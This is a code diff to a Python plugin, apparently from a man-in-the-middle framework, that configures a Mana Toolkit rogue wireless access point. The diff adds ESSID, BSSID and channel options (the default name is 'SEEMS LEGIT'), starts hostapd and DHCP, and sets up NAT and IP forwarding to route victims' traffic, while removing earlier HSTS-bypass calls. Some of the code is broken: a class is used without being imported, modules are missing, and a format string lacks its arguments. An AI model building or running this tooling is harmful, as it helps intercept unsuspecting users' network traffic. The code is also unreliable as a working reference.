@@ -16,10 +16,12 @@
 # USA
 #
 
-import sys
 from plugins.plugin import Plugin
+from core.utils import iptables, NetworkManager
+from core.hostapd_mana import HostAPDMana
 
 class ManaToolkit(Plugin):
+
     name      = 'ManaToolkit'
     optname   = 'mana'
     desc      = 'Use Mana Toolkit to perform rogue AP attack.'
@@ -28,44 +30,36 @@ class ManaToolkit(Plugin):
 
     def initialize(self, options):
 
-        from core.sslstrip.URLMonitor import URLMonitor
-        from core.servers.DNS import DNSChef
-        from core.utils import iptables
-
         self.options = options
+
         self.phy = options.phy
-        if options.upstream:
-            self.upstream = options.upstream
+        self.upstream = options.upstream
+        self.essid = options.essid
+        self.bssid = options.bssid
+        self.channel = options.channel
 
+        self.iptables = iptables.get_instance()
         self.network_manager = NetworkManager.get_instance()
-        self.iptables = iptables()
-
+        self.hostapd = HostAPDMana.get_instance()
+        self.dhcpd = DHCPDMana.get_instance()
+        
         if options.nat_simple:
-
             self._initialize_nat_simple()
 
         elif options.nat_full:
-
             self._initialize_nat_full()
 
         elif options.noupstream_all:
-
             self._initialize_noupstream()
 
         elif options.noupstream_eap:
-
             self._initialize_noupstream_eap()
 
         elif options.noupstream_eaponly:
-
             self._initialize_noupstream_eaponly()
 
         elif options.noupstream:
-
             self._initialize_noupstream()
-
-        URLMonitor.getInstance().setHstsBypass()
-        DNSChef().setHstsBypass()
 
     def _initialize_nat_simple(self):
     
@@ -74,16 +68,27 @@ class ManaToolkit(Plugin):
 
         os.system('ifconfig %s up' % self.phy)
 
-        self.hostapd.configure(phy=self.phy, upstream=self.upstream)
+        self.hostapd.configure(phy=self.phy,
+                            essid=self.essid,
+                            bssid=self.bssid,
+                            channel=self.channel)
         self.hostapd.start()
         time.sleep(5)
         os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0')
         os.system('route add -net 10.0.0.1 netmask 255.255.255.0 gw 10.0.0.1')
 
-        # call to dhcpd goes here
+        self.dhcpd.select_conf('dhcpd.conf')
+        self.dhcpd.start()
+        
         set_ip_forwarding(1)
 
         self.iptables.ROGUE_AP_NAT(upstream=self.upstream, phy=self.phy)
+
+    def on_shutdown(self):
+
+        self.iptables.flush()
+        self.hostapd.stop()
+        self.dhcpd.stop()
 
     def options(self, options):
 
@@ -128,9 +133,26 @@ class ManaToolkit(Plugin):
         options.add_argument('--phy-iface', 
             dest='phy',
             type=str,
-            required=False,
+            required=True,
             help='AP iface.')
 
-    def on_shutdown(self):
-        from core.utils import iptables
-        iptables().flush()
+        options.add_argument('--channel', 
+            dest='channel',
+            type=int,
+            required=True,
+            help='AP channel.')
+
+        options.add_argument('--bssid', 
+            dest='bssid',
+            default='00:11:22:33:44:00',
+            type=str,
+            required=False,
+            help='AP bssid.')
+
+        options.add_argument('--essid', 
+            dest='essid',
+            default='SEEMS LEGIT',
+            type=str,
+            required=False,
+            help='AP name.')
+
